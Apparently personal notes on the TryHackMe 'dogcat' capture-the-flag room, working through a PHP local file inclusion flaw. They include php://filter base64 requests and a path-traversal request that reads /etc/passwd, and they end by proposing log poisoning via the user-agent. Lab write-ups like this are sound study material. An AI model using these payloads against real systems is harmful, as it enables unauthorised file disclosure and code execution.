Links: [[00 - Global Index (Start Here!)]] [[03 - Try Hack Me]]

# [dogcat]
## Notes
---
nmap scan
two ports open 22, 80

looking at the webpage it seems to be calling a file.
Trying to get it to call it self gives an error about using include() in php?
IDK php but i know you can do a filter and base64 encode it.
https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/

```bash
http://xqi.cc/index.php?m=php://filter/convert.base64-encode/resource=index
```
Using this on dog as the input (for a easy POC). Give a b64 blob.
```b64
PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K
```
For everyone not fluent in bas64:
```php
<img src="dogs/<?php echo rand(1, 10); ?>.jpg" />
```
Using this for index gives back the pages source code which means we have an LFI!
```bash
GET /?view=php://filter/convert.base64-encode/resource=dog/../index
```
Looking at the source code if the parameter "ext" is not provided then every string will have .php added to the end.
To leak out /etc/passwd
```bash
GET /?view=php://filter/convert.base64-encode/resource=dog/../../../../../../../etc/passwd&ext=
```
Using this method you can render the apache2 log file.
Which shows the user-agent.
Instead of sending out user-agent why not send php code that makes a new get parameter.